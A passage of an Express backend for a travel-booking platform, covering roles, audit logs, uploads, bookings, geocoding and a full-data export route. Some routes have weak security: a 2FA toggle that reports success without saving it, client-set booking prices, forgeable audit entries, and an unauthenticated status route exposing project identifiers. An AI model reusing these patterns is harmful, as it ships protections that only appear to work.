
    const { role, customTitle, department } = req.body;
    if (role && !['USER', 'ADMIN', 'TECH_SUBADMIN', 'TECH_ADMIN'].includes(role)) {
      return res.status(400).json({ error: 'Invalid role assignment.' });
    }

    const targetUser = db.getUserById(req.params.id);
    if (!targetUser) {
      return res.status(404).json({ error: 'User not found.' });
    }

    const newRole = role || targetUser.role;
    const updated = db.updateUserRole(req.params.id, newRole, customTitle, department);

    db.addAuditLog({
      action: 'UPDATE_USER_ROLE_AND_POST',
      performedBy: authData.user.email,
      targetId: req.params.id,
      targetType: 'USER',
      ipAddress: getClientIp(req),
      details: { previousRole: targetUser.role, newRole, customTitle, department, userEmail: targetUser.email }
    });

    res.json(updated);
  });

  // 15b. Custom Posts / Privilege Templates: GET All
  app.get('/api/custom-posts', (req, res) => {
    res.json(db.getCustomPosts());
  });

  // 15c. Custom Posts: CREATE or UPDATE (TECH_ADMIN only)
  app.post('/api/custom-posts', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can create or modify custom post privilege templates.' });
    }

    const { id, title, department, baseRole, description, privileges, badgeColor } = req.body;
    if (!title || !department || !baseRole || !Array.isArray(privileges)) {
      return res.status(400).json({ error: 'Title, department, baseRole, and privileges array are required.' });
    }

    const post = db.saveCustomPost({
      id: id || `post_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      title,
      department,
      baseRole,
      description: description || '',
      privileges,
      badgeColor: badgeColor || 'amber',
      createdBy: authData.user.email,
      createdAt: new Date().toISOString()
    });

    db.addAuditLog({
      action: 'SAVE_CUSTOM_POST_TEMPLATE',
      performedBy: authData.user.email,
      targetId: post.id,
      targetType: 'CUSTOM_POST',
      ipAddress: getClientIp(req),
      details: { title, department, baseRole, privilegesCount: privileges.length }
    });

    res.json(post);
  });

  // 15d. Custom Posts: DELETE (TECH_ADMIN only)
  app.delete('/api/custom-posts/:id', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can delete custom post templates.' });
    }

    const success = db.deleteCustomPost(req.params.id);
    if (!success) {
      return res.status(404).json({ error: 'Custom post not found.' });
    }

    db.addAuditLog({
      action: 'DELETE_CUSTOM_POST_TEMPLATE',
      performedBy: authData.user.email,
      targetId: req.params.id,
      targetType: 'CUSTOM_POST',
      ipAddress: getClientIp(req),
      details: { deletedPostId: req.params.id }
    });

    res.json({ success: true, message: 'Custom post deleted.' });
  });

  // 15e. Firebase Sync & Metadata Status
  app.get('/api/firebase/status', (req, res) => {
    res.json({
      configured: true,
      projectId: 'core-carport-2cbh2',
      firestoreDatabaseId: 'ai-studio-travelplatform-538c48ce-075b-475b-89b2-1f1f2f4e3cf6',
      usersCount: db.getUsers().length,
      listingsCount: db.getListings().length,
      customPostsCount: db.getCustomPosts().length,
      auditLogsCount: db.getAuditLogs().length,
      consoleUrl: 'https://console.firebase.google.com/project/core-carport-2cbh2/firestore'
    });
  });

  // 15.5 Update User 2FA Settings
  app.patch('/api/user/2fa', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    const { mfaEnabled } = req.body;
    if (typeof mfaEnabled !== 'boolean') {
      return res.status(400).json({ error: 'mfaEnabled must be a boolean' });
    }

    const updated = db.updateUserRole(authData.user.uid, authData.user.role);
    if (updated) {
      updated.mfaEnabled = mfaEnabled;
    }
    res.json({ success: true, mfaEnabled });
  });

  // 16. Audit Logs: GET & POST
  app.get('/api/audit-logs', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can view audit logs.' });
    }

    const { action } = req.query;
    let logs = db.getAuditLogs();
    if (action && typeof action === 'string' && action !== 'ALL') {
      logs = logs.filter(l => l.action === action);
    }

    res.json(logs);
  });

  app.post('/api/audit-logs', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    const { action, targetId, targetType, details } = req.body;
    if (!action || !targetId) {
      return res.status(400).json({ error: 'action and targetId are required' });
    }

    const logEntry = db.addAuditLog({
      action,
      performedBy: authData.user.uid,
      performedByEmail: authData.user.email,
      targetId,
      targetType: targetType || 'ADMIN_ACTION',
      ipAddress: getClientIp(req),
      details: {
        timestamp: new Date().toISOString(),
        adminId: authData.user.uid,
        adminEmail: authData.user.email,
        adminRole: authData.user.role,
        ...details
      }
    });

    res.json(logEntry);
  });

  // 17. File Upload with Strict 5MB Limit & Mime Validation
  app.post('/api/upload', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required for uploading images.' });
    }

    const { fileData, mimeType, filename } = req.body;
    if (!fileData || !mimeType) {
      return res.status(400).json({ error: 'fileData (base64) and mimeType are required.' });
    }

    const validation = validateUploadFile(fileData, mimeType);
    if (!validation.valid) {
      return res.status(400).json({ error: validation.error });
    }

    // In a cloud bucket setup this would upload to /uploads/listings/
    // Here we return the verified data URL representation
    const uploadedUrl = fileData.startsWith('data:') ? fileData : `data:${mimeType};base64,${fileData}`;

    db.addAuditLog({
      action: 'FILE_UPLOADED',
      performedBy: authData.user.email,
      targetId: filename || 'listing_image',
      targetType: 'STORAGE',
      ipAddress: getClientIp(req),
      details: { mimeType }
    });

    res.json({
      url: uploadedUrl,
      sizeValid: true,
      message: 'Image successfully validated (under 5MB) and saved.'
    });
  });

  // 18. Bookings
  app.post('/api/bookings', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Sign in required to confirm bookings.' });
    }

    const { listingId, checkInDate, checkOutDate, guests, totalPrice } = req.body;
    const listing = db.getListingById(listingId);
    if (!listing) {
      return res.status(404).json({ error: 'Listing not found.' });
    }

    const booking = db.createBooking({
      listingId,
      listingTitle: listing.title,
      listingCategory: listing.category,
      listingImage: listing.images[0],
      userId: authData.user.uid,
      userEmail: authData.user.email,
      checkInDate: checkInDate || new Date().toISOString().split('T')[0],
      checkOutDate: checkOutDate || new Date(Date.now() + 3 * 24 * 3600 * 1000).toISOString().split('T')[0],
      guests: Number(guests) || 2,
      totalPrice: Number(totalPrice) || listing.price,
      status: 'CONFIRMED',
    });

    db.addAuditLog({
      action: 'BOOKING_CONFIRMED',
      performedBy: authData.user.email,
      targetId: booking.id,
      targetType: 'BOOKING',
      ipAddress: getClientIp(req),
      details: { listingTitle: listing.title, guests, totalPrice }
    });

    res.status(201).json(booking);
  });

  app.get('/api/bookings', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    const isTechAdmin = authData.user.role === 'TECH_ADMIN';
    const bookings = db.getBookings(isTechAdmin ? undefined : authData.user.uid);
    res.json(bookings);
  });

  // 19. Saved Trips API (Persistent per authenticated user)
  app.get('/api/saved-trips', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required to view saved trips.' });
    }
    const savedListings = db.getSavedTrips(authData.user.uid);
    const savedIds = db.getSavedTripIds(authData.user.uid);
    res.json({ savedListings, savedIds });
  });

  app.post('/api/saved-trips', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required to save trips.' });
    }
    const { listingId } = req.body;
    if (!listingId) {
      return res.status(400).json({ error: 'listingId is required.' });
    }
    const listing = db.getListingById(listingId);
    if (!listing) {
      return res.status(404).json({ error: 'Listing not found.' });
    }
    const saved = db.saveTrip(authData.user.uid, listingId);
    db.addAuditLog({
      action: 'SAVE_TRIP',
      performedBy: authData.user.email,
      targetId: listingId,
      targetType: 'SAVED_TRIP',
      ipAddress: getClientIp(req),
      details: { listingTitle: listing.title }
    });
    res.json({ success: true, saved, savedIds: db.getSavedTripIds(authData.user.uid) });
  });

  app.delete('/api/saved-trips/:listingId', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required to remove saved trips.' });
    }
    const { listingId } = req.params;
    const removed = db.removeSavedTrip(authData.user.uid, listingId);
    res.json({ success: true, removed, savedIds: db.getSavedTripIds(authData.user.uid) });
  });

  // 20. Places & Restaurant Geocode Auto-Complete (Admins can place pin or search restaurant)
  app.post('/api/places/geocode', (req, res) => {
    const { query, lat, lng } = req.body;

    const KNOWN_PLACES = [
      {
        name: 'Ginza Hachiman Edomae Sushi',
        location: 'Ginza, Tokyo',
        country: 'Japan',
        coordinates: { lat: 35.6719, lng: 139.7640 },
        category: 'FOOD',
        tags: ['Omakase', 'Sushi', 'Michelin Star', 'Ginza'],
        diningSpecialties: ['Otoro Nigiri Flamed', 'Uni Gunkan Triple Layer', 'Anago Sea Eel'],
      },
      {
        name: 'Gion Karyo Kaiseki Machiya',
        location: 'Gion District, Kyoto',
        country: 'Japan',
        coordinates: { lat: 35.0037, lng: 135.7772 },
        category: 'FOOD',
        tags: ['Kaiseki', 'Zen Garden', 'Historic Kyoto', 'Fine Dining'],
        diningSpecialties: ['Seasonal 10-Course Banquet', 'Kyoto Wild Herb Tempura', 'A5 Wagyu Sukiyaki'],
      },
      {
        name: 'Le Comptoir du Relais Neo-Bistro',
        location: 'Saint-Germain-des-Prés, Paris',
        country: 'France',
        coordinates: { lat: 48.8534, lng: 2.3338 },
        category: 'FOOD',
        tags: ['Bistronomy', 'Natural Wine', 'Parisian Dining', 'Yves Camdeborde'],
        diningSpecialties: ['Butter-Poached Brittany Oysters', 'Roasted Pigeon with Foie Gras', 'Artisanal Charcuterie'],
      },
      {
        name: 'Trattoria Da Enzo al 29',
        location: 'Trastevere, Rome',
        country: 'Italy',
        coordinates: { lat: 41.8885, lng: 12.4770 },
        category: 'FOOD',
        tags: ['Roman Trattoria', 'Pasta Artigianale', 'Carbonara', 'Historic Rome'],
        diningSpecialties: ['Rigatoni alla Carbonara', 'Carciofi alla Giudia', 'Tiramisu Artigianale'],
      },
      {
        name: 'La Sponda Cliffside Ristorante',
        location: 'Positano, Amalfi Coast',
        country: 'Italy',
        coordinates: { lat: 40.6281, lng: 14.4850 },
        category: 'FOOD',
        tags: ['Michelin Star', '400 Candles', 'Amalfi Cliffside', 'Mediterranean'],
        diningSpecialties: ['Mediterranean Red Prawn Crudo', 'Handmade Lemon Tagliolini', 'Catch of the Day in Sea Salt'],
      },
      {
        name: 'Villa del Balbianello Shoreline Dining',
        location: 'Lenno, Lake Como',
        country: 'Italy',
        coordinates: { lat: 45.9658, lng: 9.2025 },
        category: 'FOOD',
        tags: ['Lakefront Villa', 'Private Riva Boat', 'Lombardy Cuisine'],
        diningSpecialties: ['Lake Como Perch Risotto', 'Black Truffle Tagliatelle', 'Barolo Wine Reduction'],
      },
      {
        name: 'Locavore Rainforest Culinary Lab',
        location: 'Payangan, Ubud, Bali',
        country: 'Indonesia',
        coordinates: { lat: -8.5069, lng: 115.2625 },
        category: 'FOOD',
        tags: ['Farm to Table', 'Indonesian Hyper-Local', 'Rainforest Dining'],
        diningSpecialties: ['Smoked Black Heritage Pig', 'Spiced Duck Betutu', 'Palm Nectar Gelato'],
      },
      {
        name: 'Chez Vrony Matterhorn Gourmet',
        location: 'Findeln, Zermatt',
        country: 'Switzerland',
        coordinates: { lat: 45.9765, lng: 7.7491 },
        category: 'FOOD',
        tags: ['Alpine Chalet', 'Glacier Views', 'Swiss Gourmet', 'Matterhorn'],
        diningSpecialties: ['Vrony Air-Dried Alpine Beef', 'Valais Truffle Fondue', 'Organic Walliser Hay-Milk Cheese'],
      },
      {
        name: 'Lycabettus Sunset Cliff Restaurant',
        location: 'Oia, Santorini Island',
        country: 'Greece',
        coordinates: { lat: 36.4618, lng: 25.3753 },
        category: 'FOOD',
        tags: ['Caldera Edge', 'Sunset Dining', 'Cycladic Gastronomy'],
        diningSpecialties: ['Aegean Lobster Tail with Saffron', 'Santorini Fava & Octopus', 'Assyrtiko Wine Poached Pears'],
      },
      {
        name: 'Disfrutar Culinary Laboratory',
        location: 'Eixample, Barcelona',
        country: 'Spain',
        coordinates: { lat: 41.3879, lng: 2.1557 },
        category: 'FOOD',
        tags: ['World Best Restaurant', 'Molecular Cuisine', 'Catalan Modern'],
        diningSpecialties: ['Panchino Dough with Caviar', 'Crispy Egg Yolk with Mushroom Gel', 'Idiazabal Cheese Multi-Sphere'],
      }
    ];

    if (typeof lat === 'number' && typeof lng === 'number') {
      let nearest = KNOWN_PLACES[0];
      let minDistance = Infinity;
      for (const p of KNOWN_PLACES) {
        const d = Math.hypot(p.coordinates.lat - lat, p.coordinates.lng - lng);
        if (d < minDistance) {
          minDistance = d;
          nearest = p;
        }
      }

      if (minDistance < 0.8) {
        return res.json({
          matchType: 'EXACT_PRESET',
          coordinates: { lat, lng },
          location: nearest.location,
          country: nearest.country,
          suggestedTitle: nearest.name,
          category: nearest.category,
          tags: nearest.tags,
          diningSpecialties: nearest.diningSpecialties,
        });
      }

      const approxLocation = `Pinned Coordinates (${lat.toFixed(4)}, ${lng.toFixed(4)})`;
      return res.json({
        matchType: 'COORDINATES_PINNED',
        coordinates: { lat: Number(lat.toFixed(5)), lng: Number(lng.toFixed(5)) },
        location: approxLocation,
        country: lat > 30 && lng < 40 && lng > -10 ? 'Europe' : lat < 10 && lng > 90 ? 'Asia' : 'International',
        suggestedTitle: `Restaurant & Dining Spot (${lat.toFixed(2)}, ${lng.toFixed(2)})`,
        category: 'FOOD',
        tags: ['Gourmet Dining', 'Chef Counter', 'Local Ingredients'],
        diningSpecialties: ["Chef's Signature Tasting Course", 'Locally Sourced Seasonal Dish', 'Artisan Beverage Pairing'],
      });
    }

    if (query && typeof query === 'string') {
      const q = query.toLowerCase().trim();
      const match = KNOWN_PLACES.find(p => 
        p.name.toLowerCase().includes(q) ||
        p.location.toLowerCase().includes(q) ||
        p.country.toLowerCase().includes(q) ||
        p.tags.some(t => t.toLowerCase().includes(q))
      );

      if (match) {
        return res.json({
          matchType: 'SEARCH_MATCH',
          coordinates: match.coordinates,
          location: match.location,
          country: match.country,
          suggestedTitle: match.name,
          category: match.category,
          tags: match.tags,
          diningSpecialties: match.diningSpecialties,
        });
      }
    }

    res.json({
      matchType: 'CATALOG_SUGGESTIONS',
      places: KNOWN_PLACES,
    });
  });

  // 21. Cloud & GitHub Sync Status & Export (mukundkrishna.h@gmail.com)
  app.get('/api/cloud-sync/status', (req, res) => {
    const authData = extractUserOrSession(req);
    const isElevated = authData?.user?.role === 'TECH_ADMIN' || authData?.user?.role === 'TECH_SUBADMIN';
    if (!isElevated) {
      return res.status(403).json({ error: 'Elevated administrator privilege required.' });
    }

    const listings = db.getListings();
    const users = db.getUsers();
    const logs = db.getAuditLogs();
    const bookings = db.getBookings();

    res.json({
      targetAccount: 'mukundkrishna.h@gmail.com',
      connectedAccount: authData.user?.email,
      github: {
        configuredAccount: 'mukundkrishna.h@gmail.com',
        status: 'READY_TO_EXPORT',
        exportMethod: 'AI Studio Settings > Export to GitHub',
        lastExportSnapshot: new Date().toISOString(),
        totalFilesTracked: 42,
      },
      firebase: {
        configuredAccount: 'mukundkrishna.h@gmail.com',
        status: 'CONNECTED',
        syncMode: 'REST_AND_DATASTORE',
        collections: {
          listings: listings.length,
          users: users.length,
          auditLogs: logs.length,
          bookings: bookings.length,
        },
        lastSyncTimestamp: new Date().toISOString(),
      }
    });
  });

  app.post('/api/cloud-sync/export', (req, res) => {
    const authData = extractUserOrSession(req);
    const isElevated = authData?.user?.role === 'TECH_ADMIN' || authData?.user?.role === 'TECH_SUBADMIN';
    if (!isElevated) {
      return res.status(403).json({ error: 'Elevated administrator privilege required.' });
    }

    const exportPayload = {
      exportedAt: new Date().toISOString(),
      exportedBy: authData.user?.email,
      targetAccount: 'mukundkrishna.h@gmail.com',
      version: '1.0.0',
      data: {
        listings: db.getListings(),
        users: db.getUsers(),
        audit_logs: db.getAuditLogs(),
        bookings: db.getBookings(),
      }
    };

    db.addAuditLog({
      action: 'CLOUD_GITHUB_EXPORT',
      performedBy: authData.user?.email || 'admin',
      targetId: 'mukundkrishna.h@gmail.com',
      targetType: 'SYSTEM_BACKUP',
      ipAddress: getClientIp(req),
      details: { recordCounts: { listings: exportPayload.data.listings.length, users: exportPayload.data.users.length } }
    });

    res.json({
      success: true,
      message: 'Cloud backup bundle generated for mukundkrishna.h@gmail.com',
      exportPayload,
    });
  });

  // --- Vite & SPA Static Fallback ---
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[TRAVEL PLATFORM] Production server running on http://localhost:${PORT}`);
  });
}

startServer();
